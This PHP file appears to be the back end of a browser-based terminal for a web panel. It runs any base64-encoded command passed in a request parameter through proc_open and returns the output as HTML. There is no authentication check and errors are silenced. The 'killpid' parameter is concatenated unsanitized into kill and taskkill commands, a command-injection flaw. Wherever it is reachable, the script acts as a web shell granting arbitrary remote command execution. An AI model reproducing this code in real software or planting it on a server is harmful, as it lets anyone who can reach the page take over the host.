<?php
error_reporting(0);
if(@$_REQUEST['killpid']){
if (PATH_SEPARATOR == ':') {
	$r=str_replace("\n"," ",str_replace("\r\n"," ",pop('kill -9 '.@$_REQUEST['killpid']))); //pop('kill -9 '.$_REQUEST['killpid']))
}else{
	$r=str_replace("\n"," ",str_replace("\r\n"," ",exec('taskkill /PID '.@$_REQUEST['killpid'] . ' /T /F'))); 
}
	die("<script>alert('".@$_REQUEST['killpid']." : ".($r?$r:((PATH_SEPARATOR == ':')?"Killing!":"No Found!"))."');</script>");
}
if(!@$_REQUEST['command']){
	die("No Command!");
}
$command=@base64decode(@$_REQUEST['command']);
$cd=@base64decode(@$_REQUEST['cd']);
if(!$command){
	die("Command Error!");
}
if (PATH_SEPARATOR != ':'){
	$bin=array("wget");
	if(in_array(strtolower($command),$bin)||in_array(strtolower(substr($command,0,5)),$bin)){
		$command=getcwd()."\\bin\\".$command;
	}
	$command = encode_iconv("UTF-8", "gbk", ($command));
}
if($cd){chdir($cd);}
@set_time_limit(0);
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")/*array("file", "./proc.log", "a") // stderr is a file to write to*/
);
$cwd=null;
//die("cd $cd&&".$command." 2>&1");
/*$handle = popen($command . "  2>&1", 'r');
          while (!feof($handle)) {
                $buffer = fgets($handle);
                $buffer = trim(str_replace(">", "&gt", str_replace("<", "&lt", $buffer)));
                echo "$buffer<br/>\n";
                ob_flush();
                flush();
            }
            pclose($handle);
die(var_dump(getmypid()));
*/
if (PATH_SEPARATOR != ':'&&$cd) {
$drive="cd $cd&&".substr($cd,0,2)."&&";
}else{
$drive="";
}
$process = proc_open($drive.$command." 2>&1", $descriptorspec, $pipes,$cwd);
function encode_iconv($sencoding, $tencoding, $str) {
    if (function_exists("mb_convert_encoding")) {
        $str = mb_convert_encoding($str, $tencoding, $sencoding);
    } else {
        $str = iconv($sencoding, $tencoding . "//TRANSLIT//IGNORE", $str);
    }
    return $str;
}
function pop($c){
            $handle = popen( $c. "  2>&1", 'r');
            while (!feof($handle)) {
                $buffer = fgets($handle);
               return ($buffer);
            }
            pclose($handle);
}
function s_write_m($contents,$pipes,$file,$sec=1){
    fwrite($pipes[0], $contents.">".$file."\n");
	sleep($sec);
return file_get_contents($file);
}
function s_write_s($contents=array(""),$pipes){
for($i=0;$i<count($contents);$i++){
	$cs=explode("-|>",$contents[$i]);
	fwrite($pipes[0], $cs[0]."\n");
	if(@$cs[1]&&@$cs[1]>0){sleep($cs[1]);}
	}
    fclose($pipes[0]);
	s_read($pipes);
}
function htmlsp($str){
return str_replace(">", "&gt", str_replace("<", "&lt",$str));
}
function s_read($pipes){
$rr=false;
    while (!feof($pipes[1])) { 
        $r= str_replace("\n","<br>",htmlsp(fgets($pipes[1], 1024)));
		if($r){$rr=true;}
		echo $r;
                ob_flush();
                flush();		
    }
    fclose($pipes[1]);
}
function base64decode($base64){
return base64_decode(str_replace(" ","+",$base64));
}
function s_close($process,$pipes){
@fclose($pipes[0]);
@fclose($pipes[1]);
return proc_close($process);
}
$pstatus=proc_get_status( $process );
$pisres=is_resource($process);
if (PATH_SEPARATOR != ':'){$pid=$pstatus["pid"];}else{$pid=getmypid();}//posix_getpid 
echo '<link rel="stylesheet" type="text/css" href="core/style.css" /><link rel="stylesheet" type="text/css" href="theme.css" /><style>body{padding:10px}</style>';
echo '<script>var ifm=window.parent.document.getElementsByClassName("runifm")[window.parent.document.getElementsByClassName("runifm").length-1];
function a(e){if (event.ctrlKey==1){if(document.all){k=e.keyCode;}else{k=e.which;}
  if(k==86){
		//alert(\'你按下了CTRL+V\')
  }
  if(k==67){
		//alert(\'你按下了CTRL+C\')
		killpid("'.$pid.'");
  }
}}var isdone=0;function done(){isdone=1;document.getElementById("pid").style.bottom="";document.getElementById("pid").style.top=0;}function killpid(pid){return document.getElementById("htcl").innerHTML=(\'<iframe src="?killpid=\'+pid+\'"></iframe>\');}</script><body onkeydown="if(!isdone){a(event)}" oncontextmenu="return false"><div id="htcl" style="display:none;"></div><span id="pid" style="float:right;right:0;bottom:0;position:fixed;">PID <a href="javascript:void(0);" onclick="killpid(\''.$pid.'\');">'.$pid.'</a></span>';
ob_flush();
flush();		
$aj=@json_decode(@base64decode(@$_REQUEST['flag']),1);
if(!$aj){$aj=array("");}
s_write_s($aj,$pipes);
//die( shell_exec("dir"));
//s_read($pipes);
s_close($process,$pipes);
echo "</body>";
?>